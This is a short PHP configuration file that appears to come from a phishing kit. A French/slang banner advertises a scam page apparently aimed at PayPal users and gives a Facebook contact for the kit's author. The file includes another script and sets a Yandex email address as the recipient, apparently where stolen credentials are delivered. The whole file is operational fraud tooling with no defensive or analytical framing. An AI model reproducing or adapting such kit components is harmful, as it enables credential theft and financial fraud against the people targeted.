<?php
include('../hyun.php');
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||                                                                              ||
# ||                                 SCAMA PPL PAPA NA INFORMATIQ                                ||
# ||                         SI VOUS AVEZ BESOIN D'AIDE, CONTACTEZ-MOI:                        ||
# ||                    https://www.facebook.com/rodondo.core.i7                 ||
# ||                                                                              ||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
$to = "edzon-mx@yandex.com";
?>